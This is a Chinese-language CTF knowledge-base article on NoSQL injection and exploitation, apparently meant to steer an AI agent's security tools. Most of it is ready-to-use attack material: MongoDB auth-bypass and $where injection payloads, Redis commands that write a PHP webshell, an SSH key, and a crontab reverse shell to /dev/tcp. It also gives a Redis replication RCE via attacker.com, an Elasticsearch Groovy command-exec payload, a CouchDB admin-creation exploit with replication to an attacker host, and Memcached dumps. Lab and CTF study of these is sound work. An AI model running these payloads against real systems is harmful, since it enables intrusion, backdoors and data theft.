---
id: "ctf-website/24-database/03-nosql-injection"
title: "NoSQL Injection — NoSQL 注入攻击"
title_en: "NoSQL Injection Attacks"
summary: >
  MongoDB、Redis、Elasticsearch、CouchDB等NoSQL数据库的注入与利用技术：MongoDB $ne/$gt/$regex操作符认证绕过和$where JavaScript代码执行、Redis未授权访问写Webshell/SSH Key/Crontab、Elasticsearch Groovy脚本注入和CouchDB RCE（CVE-2017-12635）。
summary_en: >
  Injection and exploitation techniques for NoSQL databases: MongoDB $ne/$gt/$regex operator authentication bypass and $where JavaScript code execution, Redis unauthorized access for writing webshell/SSH key/crontab, Elasticsearch Groovy script injection, and CouchDB RCE (CVE-2017-12635).
board: "ctf-website"
category: "24-database"
signals:
  - "MongoDB $ne $gt $regex"
  - "Redis PING 未授权 CONFIG SET"
  - "Elasticsearch Groovy 脚本"
  - "CouchDB _all_dbs"
  - "$where JavaScript 注入"
  - "RESP 协议 Redis"
  - "CVE-2017-12635 CouchDB"
  - "BSON 注入"
mcp_tools:
  - "http_probe"
  - "run_ctf_tool"
  - "kb_router"
  - "kb_read_file"
keywords:
  - "NoSQL 注入"
  - "MongoDB 注入"
  - "Redis 未授权"
  - "Elasticsearch 注入"
  - "CouchDB RCE"
  - "$where 代码执行"
  - "Memcached 攻击"
  - "主从复制 RCE"
  - "Groovy 脚本注入"
  - "$ne 绕过"
difficulty: "intermediate"
tags:
  - "database"
  - "nosql"
  - "mongodb"
  - "redis"
  - "elasticsearch"
  - "couchdb"
  - "injection"
language: "zh-CN"
last_updated: "2026-06-25"
related_articles: []
---
# NoSQL Injection — NoSQL 注入攻击

> MongoDB、Redis、Elasticsearch、CouchDB 等 NoSQL 数据库的注入与利用技术。

## 关键词

`NoSQL注入` `MongoDB注入` `Redis未授权` `Elasticsearch注入` `CouchDB RCE` `$ne` `$gt` `$regex` `$where` `SSJS` `服务端JavaScript注入` `BSON` `RESP协议`

## 1. MongoDB 注入

### 1.1 认证绕过

```javascript
// 正常登录
db.users.findOne({username: req.body.user, password: req.body.pass})

// 注入 payload
username[$ne]=1&password[$ne]=1
// → {username: {$ne: 1}, password: {$ne: 1}}
// → 匹配任意非 1 的记录 → 绕过登录

// 通杀 payload
username[$regex]=.*&password[$ne]=1
username[$gt]=&password[$gt]=
```

### 1.2 $where 代码执行

```javascript
// 注入点
db.collection.find({$where: "this.field == '" + input + "'"})

// Payload
' || sleep(5000) || '
' || (function(){var d=new Date();do{}while(new Date()-d<5000);return 1;})() || '

// 数据提取
' || (()=>{return tojson(db.users.findOne())})() || '
```

### 1.3 操作符注入

```
$ne   → 不等于
$gt   → 大于
$lt   → 小于
$regex → 正则匹配
$exists → 字段存在
$type  → 类型检查
$mod   → 取模
$where → JavaScript 表达式
```

### 1.4 注入探测

```
// PHP 数组参数
?username[$ne]=x          → MongoDB
?username[$gt]=            → MongoDB
?username[$regex]=^adm    → MongoDB
?username[0]=admin        → MongoDB

// JSON body
{"username": {"$ne": null}}
{"username": {"$regex": "^a"}}
```

## 2. Redis 未授权访问

### 2.1 探测

```bash
redis-cli -h target -p 6379 PING        # PONG → 未授权
redis-cli -h target -p 6379 INFO         # 服务器信息
redis-cli -h target -p 6379 CONFIG GET * # 配置信息
```

### 2.2 写 Webshell

```bash
redis-cli -h target -p 6379
CONFIG SET dir /var/www/html/
CONFIG SET dbfilename shell.php
SET payload "<?php system($_GET['cmd']);?>"
BGSAVE
```

### 2.3 写 SSH Key

```bash
redis-cli -h target -p 6379
CONFIG SET dir /root/.ssh/
CONFIG SET dbfilename authorized_keys
SET key "\n\nssh-rsa AAAAB3... attacker@kali\n\n"
BGSAVE
```

### 2.4 写 Crontab

```bash
redis-cli -h target -p 6379
CONFIG SET dir /var/spool/cron/crontabs/
CONFIG SET dbfilename root
SET crontab "\n*/1 * * * * /bin/bash -c 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'\n"
BGSAVE
```

### 2.5 主从复制 RCE (Redis 4.x/5.x)

```bash
# 攻击者搭建恶意 Redis Master
redis-cli -h target SLAVEOF attacker.com 6379
# 加载恶意模块
redis-cli -h target MODULE LOAD /tmp/exp.so
```

## 3. Elasticsearch 注入

### 3.1 Groovy 脚本注入 (ES < 2.x)

```json
POST /_search
{
  "query": {
    "filtered": {
      "query": {"match_all": {}},
      "filter": {
        "script": {
          "script": "java.lang.Runtime.getRuntime().exec('whoami')"
        }
      }
    }
  }
}
```

### 3.2 搜索注入

```json
// ES Query DSL 注入
POST /_search
{
  "query": {"query_string": {"query": "username:admin OR password:*"}}
}
```

### 3.3 信息泄露

```
GET /_cat/indices?v          # 所有索引
GET /_search?q=password      # 搜索密码字段
GET /_nodes                   # 节点信息
GET /_cluster/health          # 集群健康
```

## 4. CouchDB 攻击

### 4.1 未授权访问

```
GET /_all_dbs                  # 所有数据库
GET /_users/_all_docs          # 用户列表
GET /dbname/_all_docs?include_docs=true  # 全部文档
```

### 4.2 CouchDB RCE (CVE-2017-12635, CVE-2018-8007)

```bash
# 添加管理员用户
curl -X PUT http://target:5984/_users/org.couchdb.user:hacker \
  -d '{"type":"user","name":"hacker","roles":["_admin"],"password":"pass"}'

# 通过 replication 执行命令
curl -X POST http://target:5984/_replicate \
  -d '{"source":"db","target":"http://attacker/evil"}'
```

## 5. Memcached 攻击

### 5.1 未授权读取

```bash
echo "stats" | nc target 11211             # 统计信息
echo "stats items" | nc target 11211        # 项目列表
echo "stats cachedump 1 100" | nc target 11211  # 缓存内容
```

### 5.2 数据泄露

```bash
echo "get keyname" | nc target 11211
```

## 攻击链 / 工作流

```
1. 识别技术栈信号：MongoDB 操作符、Redis 端口、Elasticsearch API、CouchDB/Memcached Banner
2. 低风险探测：未授权访问、认证绕过、错误信息、状态接口
3. MongoDB：测试 $ne/$regex/$where 等操作符注入，确认 JSON/参数解析方式
4. Redis/Memcached：先只读 INFO/STATS/GET，确认权限与数据敏感度
5. Elasticsearch/CouchDB：枚举索引/数据库/用户，不直接执行破坏性脚本
6. 需要 RCE 链时记录版本、插件/脚本引擎状态和写入路径，隔离环境复现
7. 收敛证据：服务类型、版本、认证状态、可读键/集合/索引样例
```

## Evidence

| 服务 | 证据 |
|------|------|
| MongoDB | 注入前后查询差异、认证绕过请求、操作符 payload |
| Redis | `INFO` 输出、`CONFIG GET dir`、可读 key 名称（脱敏） |
| Elasticsearch | `_cluster/health`、索引列表、查询注入响应 |
| CouchDB | `/_all_dbs`、`/_users`、未授权状态码 |
| Memcached | `stats`、`stats items`、脱敏 key/value 样例 |

## MCP 工具映射

| 攻击步骤 | MCP 工具 | 说明 |
|---------|---------|------|
| 知识检索 | `kb_router` | 按 MongoDB、Redis、Elasticsearch、NoSQL injection 搜索 |
| 端点探测 | `http_probe` | 探测 HTTP API 型 NoSQL 服务 |
| 工具执行 | `run_ctf_tool` | 调用 nc/redis-cli/curl/自定义探测脚本 |
| 证据记录 | `workspace_write_text` | 保存服务指纹、未授权证据和脱敏样例 |

## 6. 关联技术

- [[01-sqli-fundamentals]] — SQL 注入基础
- [[04-config-exposure]] — 配置泄露
- [[05-backup-log-leak]] — 备份暴露
- [[sqli-nosqli]] — SQL/NoSQL 注入
